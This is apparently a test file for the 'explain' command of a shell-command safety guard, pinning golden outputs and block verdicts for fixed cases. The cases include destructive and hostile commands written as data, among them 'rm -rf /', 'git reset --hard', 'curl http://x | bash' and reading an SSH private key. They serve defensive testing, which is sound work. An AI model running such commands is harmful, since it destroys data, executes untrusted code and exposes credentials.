import { afterEach, describe, expect, test } from 'bun:test';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import type { ExplainResult } from '@/gate/explain';
import type { TraceStep } from '@/gate/trace';
import {
  type CliOutcome,
  type CliRow,
  runCliDifferential,
  seedFiles,
} from '../../helpers/cli-differential';
import { EXPLAIN_CASES, LIMIT_MESSAGES, LIMIT_SLUGS } from '../../helpers/explain-cases';
import { removeTempRoots } from '../../helpers/temp-home';

/**
 * `explain` is the surface a user reads when a denial surprises them, so both renderings of every
 * fixed command are pinned to a literal golden. The pin next to each row names what the row exists
 * to show — the rule that answered, the step the analyzer took, the redaction the recorder applied
 * — so a golden refreshed by hand cannot quietly accept a changed verdict.
 *
 * Nothing here is normalized beyond the temp root and the repository root the harness already
 * replaces: `explain` reads no clock, no version and no host.
 */

afterEach(() => {
  removeTempRoots();
});

const goldenFile = (name: string) =>
  join(import.meta.dir, '..', '..', 'fixtures', 'cli', 'explain', `${name}.golden`);

/** The rendering the bin produced, against the literal file. `CC_SAFETY_NET_UPDATE_GOLDENS=1`
 *  rewrites it instead of comparing. */
function pinRendering(name: string, outcome: CliOutcome): void {
  const path = goldenFile(name);
  if (process.env.CC_SAFETY_NET_UPDATE_GOLDENS === '1') {
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, outcome.stdout);
    return;
  }
  expect(outcome.stdout).toBe(readFileSync(path, 'utf-8'));
}

const isParseStep = (step: TraceStep): step is Extract<TraceStep, { type: 'parse' }> =>
  step.type === 'parse';

/** What a row still has to report. Keys the pin leaves out must be absent from the document. */
function reportFacts(document: ExplainResult) {
  return {
    result: document.result,
    ruleId: document.ruleId,
    segment: document.segment,
    parseInput: document.trace.steps.find(isParseStep)?.input,
    steps: document.trace.steps.map((step) => step.type),
    segments: document.trace.segments.map((segment) => segment.steps.map((step) => step.type)),
    activation: document.ruleActivation?.id,
    customRule: document.customRule?.id,
    rulebook: document.customRule?.rulebook,
  };
}

type Facts = Partial<ReturnType<typeof reportFacts>>;

const PINS: Record<string, Facts> = {
  '01-git-reset-hard-chain': {
    result: 'blocked',
    ruleId: 'git.reset-hard',
    segment: 'git reset --hard',
    parseInput: 'git reset --hard && git status',
    steps: ['parse'],
    segments: [['rule-check'], ['segment-skipped']],
  },
  '02-env-assignment-prefix': {
    result: 'blocked',
    ruleId: 'git.reset-hard',
    segment: 'FOO=<redacted> git reset --hard',
    // The recorder learns the assignment's value from the parse step and redacts it everywhere.
    parseInput: 'FOO=<redacted> git reset --hard',
    steps: ['parse'],
    segments: [['env-strip', 'rule-check']],
  },
  '03-leading-tokens': {
    result: 'blocked',
    ruleId: 'git.reset-hard',
    segment: 'sudo git reset --hard',
    parseInput: 'sudo git reset --hard',
    steps: ['parse'],
    segments: [['leading-tokens-stripped', 'rule-check']],
  },
  '04-shell-wrapper': {
    result: 'blocked',
    ruleId: 'git.reset-hard',
    segment: 'sh -c git reset --hard',
    parseInput: "sh -c 'git reset --hard'",
    steps: ['parse'],
    segments: [['shell-wrapper', 'recurse', 'rule-check']],
  },
  '05-interpreter': {
    result: 'blocked',
    ruleId: 'interpreter.dangerous-command',
    segment: "python -c import os; os.system('rm -rf /')",
    parseInput: 'python -c "import os; os.system(\'rm -rf /\')"',
    steps: ['parse'],
    segments: [
      [
        'interpreter',
        'recurse',
        'fallback-scan',
        'custom-rules-check',
        'dangerous-text',
        'dangerous-text',
      ],
    ],
  },
  '06-busybox': {
    result: 'blocked',
    ruleId: 'rm.recursive-force-root-or-home',
    segment: 'busybox rm -rf /',
    parseInput: 'busybox rm -rf /',
    steps: ['parse'],
    segments: [['busybox', 'recurse', 'tmpdir-check', 'rule-check']],
  },
  '07-cwd-change': {
    result: 'blocked',
    ruleId: 'rm.recursive-force-outside-cwd',
    segment: 'rm -rf build',
    parseInput: 'cd .. && rm -rf build',
    steps: ['parse'],
    segments: [
      ['fallback-scan', 'custom-rules-check', 'cwd-change'],
      ['tmpdir-check', 'rule-check'],
    ],
  },
  '08-dangerous-text': {
    result: 'blocked',
    ruleId: 'raw-text.dangerous-command',
    segment: 'W=<redacted> -rf ~',
    parseInput: 'W=<redacted>; $W',
    steps: ['parse'],
    segments: [['dangerous-text'], ['segment-skipped']],
  },
  '09-pipe-into-shell': {
    result: 'blocked',
    segment: 'bash',
    parseInput: 'curl http://x | bash',
    steps: ['parse'],
    segments: [['fallback-scan', 'custom-rules-check'], ['error']],
  },
  '10-dynamic-target': {
    result: 'allowed',
    parseInput: 'rm -rf "$target"',
    steps: ['parse'],
    segments: [['tmpdir-check', 'rule-check', 'fallback-scan', 'custom-rules-check']],
    // The rule the command would have matched had its activation capability been on.
    activation: 'rm.recursive-force-dynamic-target',
  },
  '11-allowed': {
    result: 'allowed',
    parseInput: 'git status',
    steps: ['parse'],
    segments: [['rule-check', 'fallback-scan', 'custom-rules-check']],
  },
  '12-secret-protection': {
    result: 'blocked',
    ruleId: 'secret.basename.env',
    segment: '.env',
    // A protection answered before the analyzer ran, so there is no parse step to show.
    steps: [],
    segments: [['rule-check']],
  },
  '13-policy-protection': {
    result: 'blocked',
    ruleId: 'policy-protection',
    segment: '${HOME}/.cc-safety-net/policy.json',
    steps: [],
    segments: [['rule-check']],
  },
  '14-git-metadata-protection': {
    result: 'blocked',
    ruleId: 'git-metadata-protection',
    segment: '.git',
    steps: [],
    segments: [['rule-check']],
  },
  '15-policy-apply-protection': {
    result: 'blocked',
    ruleId: 'policy-apply-protection',
    segment: 'npx -y cc-safety-net policy apply team.json',
    steps: [],
    segments: [['rule-check']],
  },
  '16-transparent-wrapper': {
    result: 'blocked',
    ruleId: 'git.reset-hard',
    segment: 'rtk git reset --hard',
    parseInput: 'rtk git reset --hard',
    steps: ['parse'],
    segments: [['transparent-wrapper', 'rule-check']],
  },
  '17-custom-rule': {
    result: 'blocked',
    ruleId: 'custom.project-rules/block-docker-system-prune',
    segment: 'docker system prune',
    parseInput: 'docker system prune',
    steps: ['parse'],
    segments: [['fallback-scan', 'custom-rules-check']],
    customRule: 'project-rules/block-docker-system-prune',
    rulebook: { name: 'project-rules', version: '1.0.0' },
  },
  '18-strict-unparseable': {
    result: 'blocked',
    segment: "echo 'unterminated",
    parseInput: "echo 'unterminated",
    steps: ['parse', 'strict-unparseable'],
    segments: [],
  },
  '19-tmpdir-check': {
    result: 'allowed',
    parseInput: 'rm -rf $TMPDIR/build',
    steps: ['parse'],
    segments: [['tmpdir-check', 'rule-check', 'fallback-scan', 'custom-rules-check']],
  },
  '20-no-command': { result: 'allowed', steps: ['error'], segments: [] },
};

function rowFor(slug: string, extra: Partial<CliRow>): CliRow {
  const explainCase = EXPLAIN_CASES.find((entry) => entry.slug === slug);
  if (!explainCase) throw new Error(`no explain case named ${slug}`);
  return {
    args: [],
    ...(explainCase.files ? { seed: (side) => seedFiles(side, explainCase.files ?? {}) } : {}),
    ...(explainCase.env ? { env: explainCase.env } : {}),
    ...extra,
  };
}

describe('explain renders the same trace from both bins', () => {
  for (const explainCase of EXPLAIN_CASES.filter((entry) => !LIMIT_SLUGS.includes(entry.slug))) {
    test(explainCase.slug, async () => {
      const asJson = await runCliDifferential(
        rowFor(explainCase.slug, { args: ['explain', '--json', explainCase.command] }),
      );
      const outcome = asJson;
      expect(outcome.exitCode).toBe(0);
      pinRendering(`${explainCase.slug}.json`, asJson);
      expect(reportFacts(JSON.parse(outcome.stdout) as ExplainResult)).toEqual(
        PINS[explainCase.slug] as ReturnType<typeof reportFacts>,
      );

      const asHuman = await runCliDifferential(
        rowFor(explainCase.slug, { args: ['explain', explainCase.command] }),
      );
      expect(asHuman.exitCode).toBe(0);
      pinRendering(`${explainCase.slug}.txt`, asHuman);
    }, 30_000);
  }
});

describe('explain reports an analysis budget breach as bounded output', () => {
  for (const [index, slug] of LIMIT_SLUGS.entries()) {
    test(slug, async () => {
      const message = LIMIT_MESSAGES[index] as string;
      const asJson = await runCliDifferential(
        rowFor(slug, {
          args: ['explain', '--json', EXPLAIN_CASES.find((e) => e.slug === slug)?.command ?? ''],
        }),
      );
      const outcome = asJson;
      expect(outcome.stdout).toBe(`${JSON.stringify({ error: message })}\n`);
      expect(outcome.exitCode).toBe(1);
      pinRendering(`${slug}.json`, asJson);

      // The human form writes the message to stderr and leaves stdout empty, so there is
      // nothing to pin as a rendering.
      const asHuman = await runCliDifferential(
        rowFor(slug, {
          args: ['explain', EXPLAIN_CASES.find((e) => e.slug === slug)?.command ?? ''],
        }),
      );
      expect(asHuman.stdout).toBe('');
      expect(asHuman.stderr).toBe(`${message}\n`);
      expect(asHuman.exitCode).toBe(1);
    }, 30_000);
  }
});

describe('explain flags', () => {
  const flagRows: { name: string; args: string[]; seed?: CliRow['seed']; exitCode: number }[] = [
    { name: 'no command', args: ['explain'], exitCode: 1 },
    { name: 'unknown option', args: ['explain', '--nope', 'x'], exitCode: 1 },
    { name: 'cwd without a value', args: ['explain', '--cwd'], exitCode: 1 },
    { name: 'cwd that does not exist', args: ['explain', '--cwd', 'nope', 'x'], exitCode: 1 },
    {
      name: 'cwd inside the project',
      args: ['explain', '--cwd', 'sub', 'git status'],
      seed: (side) => seedFiles(side, { 'project/sub': null }),
      exitCode: 0,
    },
    { name: 'multiple positionals', args: ['explain', 'git', 'reset', '--hard'], exitCode: 0 },
    // The global scan stops at the bare `--`, so `--version` is analyzer input rather than a
    // request for the version.
    {
      name: 'command after a bare double dash',
      args: ['explain', '--json', '--', '--version'],
      exitCode: 0,
    },
  ];

  for (const row of flagRows) {
    test(row.name, async () => {
      const outcome = await runCliDifferential({
        args: row.args,
        ...(row.seed ? { seed: row.seed } : {}),
      });
      expect(outcome.exitCode).toBe(row.exitCode);
    }, 30_000);
  }
});

/**
 * The inputs design §8.4 changed on purpose. Each is run and its verdict pinned, so the change
 * stays the decided one rather than whatever the port happens to produce.
 */
const KNOWN_GAPS = [
  {
    name: 'a partial program is analyzed as raw text, not as the command it resembles',
    // Before the cutover, explain analyzed the partial program and reported `git.reset-hard`
    // where the hook answered with the raw-text rule. §8.4 drops the divergence.
    command: "git reset --hard 'unterminated",
    ported: { result: 'blocked', ruleId: 'raw-text.dangerous-command' },
  },
  {
    name: 'a partial program with no dangerous text is scanned rather than parsed',
    // Same divergence with an allowed verdict: only the trace differs, `dangerous-text` where
    // the retired trace recorded `fallback-scan` and `custom-rules-check`.
    command: "echo 'unterminated",
    ported: { result: 'allowed', ruleId: undefined },
  },
  {
    name: 'a PowerShell command is matched in its own dialect',
    // The retired explain routed the pre-analysis protections as posix, so `$env:HOME` read as
    // the variable `env` followed by literal text; the pipeline parses the real dialect.
    command: 'Get-Content "$env:HOME/.ssh/id_rsa"',
    ported: { result: 'blocked', ruleId: 'secret.home.ssh' },
  },
] as const;

describe('explain diverges from the shipped CLI only where the design says it must', () => {
  for (const gap of KNOWN_GAPS) {
    test(gap.name, async () => {
      const result = await runCliDifferential({ args: ['explain', '--json', gap.command] });
      const document = JSON.parse(result.stdout) as ExplainResult;
      expect({ result: document.result, ruleId: document.ruleId }).toEqual(gap.ported);
    }, 30_000);
  }

  // The two PowerShell commands the design named as the dialect case: both parse to the same
  // words under either dialect, so the change is invisible here and they are recorded instead.
  for (const command of [
    'Remove-Item . -Recurse -Force',
    'Get-ChildItem . -Recurse | Remove-Item -Force',
  ]) {
    test(`agrees on ${command}`, async () => {
      const outcome = await runCliDifferential({ args: ['explain', '--json', command] });
      expect(outcome.exitCode).toBe(0);
    }, 30_000);
  }

  // In strict mode the partial program is unparseable, and the trace says so.
  test('strict mode answers a partial program identically', async () => {
    const outcome = await runCliDifferential({
      args: ['explain', '--json', "git reset --hard 'unterminated"],
      env: { CC_SAFETY_NET_LEVEL: 'strict' },
    });
    const document = JSON.parse(outcome.stdout) as ExplainResult;
    expect(document.trace.steps.map((step) => step.type)).toEqual(['parse', 'strict-unparseable']);
  }, 30_000);
});
